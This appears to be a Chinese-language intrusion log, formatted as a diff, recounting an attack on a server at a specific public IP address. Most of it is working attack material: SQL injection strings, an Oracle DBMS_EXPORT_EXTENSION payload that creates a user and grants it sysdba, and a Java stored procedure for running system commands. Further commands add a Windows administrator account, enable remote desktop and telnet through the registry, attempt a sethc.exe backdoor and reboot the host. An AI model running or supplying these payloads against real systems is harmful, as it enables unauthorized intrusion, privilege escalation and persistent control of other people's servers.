@@ -1,0 +1,39 @@
+提交http://211.154.103.15/server2.asp?wen=四川省
+http://211.154.103.15/server2.asp?wen=四川省' and 1=2 union select 1,NULL,……,NULL from dual--；出错显示类型不匹配，换成
+http://211.154.103.15/server2.asp?wen=四川省' and 1=2 union select '1',NULL,……,NULL from dual--;返回正确,说明第一个是字符型的，
+看下oracle版本， (select banner from sys.v_$version where rownum=1)
+操作系统版本      (select member from v$logfile where rownum=1)
+Sid               (select instance_name from v$instance)
+确定下主机ip
+telnet 漏洞页上显示的ip地址的1521端口
+利用oracle的那些默认帐号密码登录
+四川省'%20and%20''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA%20AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''CREATE USER REBEYOND IDENTIFIED BY REBEYOND'''';END;'';END;--','SYS',0,'1',0)=''--
+往数据库加了个用户名为rebeyond密码为rebeyond的用户
+四川省' and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant sysdba to rebeyond'''';END;'';END;--','SYS',0,'1',0)=''--
+把我们建的用户加为dba权限
+
+四川省' and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''GRANT CONNECT TO rebeyond'''';END;'';END;--','SYS',0,'1',0)=''--
+赋予用户远程连 接权限
+dba身份登录
+normal方式 把权限能勾的都勾上
+可以通过建立java存储过程来执行命令，注意这时建完 
+shell后要对数据库用户赋予对磁盘文件操作的权限(在sqlplus里执行)：call dbms_java.grant_permission('REBEYOND','java.io.FilePermission','c:/a.txt','read,write'); 。
+ cmd打开sqlplus（和oracle客户端一起安装的），
+输入sqlplus /nolog,
+然后输入connect [email=rebeyond/rebeyond@(description=(address_list=(address= (protocol=tcp)(host=211.154.103.15)(port=1521)))(connect_data= (SERVICE_NAME=ORCL]rebeyond/rebeyond@(description=(address_list= (address=(protocol=tcp)(host=211.154.103.15)(port=1521)))(connect_data= (SERVICE_NAME=ORCL[/email])));
+是不是用到了我们前面爆出的服务器sid呢，hoho，连接成功，下面开始执行命令，
+创建 java存储过程,代码如下：java存储过程：第一步：create or replace and compilejava souRCe named "util"asimport java.io.*;import java.lang.*;public class util extends Object{public static int RunThis(String args){Runtime rt = Runtime.getRuntime();int RC = -1;try{Process p = rt.exec(args);int bufSize = 4096;BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);int len;byte buffer[] = new byte[bufSize];// Echo back what the program spit outwhile ((len = bis.read(buffer, 0, bufSize)) != -1)System.out.write(buffer, 0, len);RC = p.waitFor();}catch (Exception e){e.printStackTrace();RC = -1;}finally{return RC;}}}第二步：create or replacefunction RUN_CMz(p_cmd in varchar2) return numberaslanguage javaname 'util.RunThis(java.lang.String) return integer';第三步：create or replace procedure RC(p_cmd in varChar)asx number;beginx := RUN_CMz(p_cmd);end;创建完之后，就可以通过x := RUN_CMz(dos命令)来执行系统命令了。建 完存储过程后系统命令执行成功，
+但是后来发现这个shell很不爽，如果遇到需要交互的命令就会卡死，
+于是用ftp传马思路抛弃，
+打个systeninfo命令看下系统，是2003，于是打算先建个超级用户 然后开3389，
+执行exec :x := RUN_CMD('net1 user');成功
+执行exec :x := RUN_CMD('net1 user rebeyond rebeyond /add&net1 localgroup administrators rebeyond /add');成功，
+下面用reg命令读下3389的状态和端口，执行
+exec :x := RUN_CMD('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"');发现fDenyTSconnections值为1，说明3389关闭，
+于是依次执行以下语句开3389：reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 3389 /freg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /freg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f
+搞定后运行mstsc连接，结果另人吐血，能连上但是却没有登录窗口，提示说什么" awgina.dll被替换成未知版本",
+于是想到了替换sethc.exe，在 shell下依次执行：exec :x :=RUN_CMD ('del c:\windows\system32\sethc.exe /f')exec :x :=RUN_CMD('del C:\WINDOWS\system32\dllcache\sethc.exe /f')exec :x :=RUN_CMD('copy c:\windows\explorer.exe c:\windows\system32\sethc.exe')，按五次shift后发现没替换成功，
+想到了telnet，用reg查看了下telnet服务的状态为禁用，于是执行reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TlntSvr" /v Start /t REG_DWORD /d 2 /f
+把telnet服务设置为自动，然后就是想办法让服务器重启开telnet。：shell里执
+rundll32.exe user.exe,restartwindows,不一会主机重启了，
+成功telnet，这样权限我们已经拿到了！但是要向图像界面进军，在telnet 执行netstat -an看了下端口
